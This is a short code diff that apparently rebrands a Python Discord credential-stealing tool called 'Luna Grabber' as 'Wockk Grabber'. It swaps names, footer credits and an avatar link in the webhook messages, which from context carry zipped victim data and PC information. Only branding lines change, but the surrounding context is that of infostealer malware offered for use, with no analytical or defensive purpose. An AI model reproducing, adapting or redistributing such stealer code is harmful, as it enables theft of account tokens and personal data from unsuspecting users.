@@ -62,7 +62,7 @@ def main(webhook: str):
     zipup()
 
     data = {
-        "username": "Luna",
+        "username": "Wockk",
         "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
     }
 
@@ -227,7 +227,7 @@ class PcInfo:
         data = {
             "embeds": [
                 {
-                    "title": "Luna Logger",
+                    "title": "Wockk Logger",
                     "color": 5639644,
                     "fields": [
                         {
@@ -236,14 +236,14 @@ class PcInfo:
                         }
                     ],
                     "footer": {
-                        "text": "Luna Grabber | Created By Smug"
+                        "text": "Wockk Grabber | Made By Wockk"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
                     }
                 }
             ],
-            "username": "Luna",
+            "username": "Wockk",
             "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
         }
 
@@ -474,11 +474,11 @@ class Discord:
                             "url": avatar_url
                         },
                         "footer": {
-                            "text": "Luna Grabber | Created By Smug"
+                            "text": "Wockk Grabber | Created By Wockk"
                         },
                     }
                 ],
-                "username": "Luna",
+                "username": "Wock",
                 "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
             }
 
@@ -497,8 +497,8 @@ class Discord:
         image.close()
 
         webhook_data = {
-            "username": "Luna",
-            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+            "username": "Wockk",
+            "avatar_url": "https://cdn.discordapp.com/attachments/816216882481725511/1222480474278985779/IMG_7058.jpg?ex=66165ea9&is=6603e9a9&hm=259b299ce7e085a6687aaf28796572677790aa726b2c81584f9f50e5926bc4ed&=&format=webp&width=683&height=683",
             "embeds": [
                 {
                     "color": 5639644,
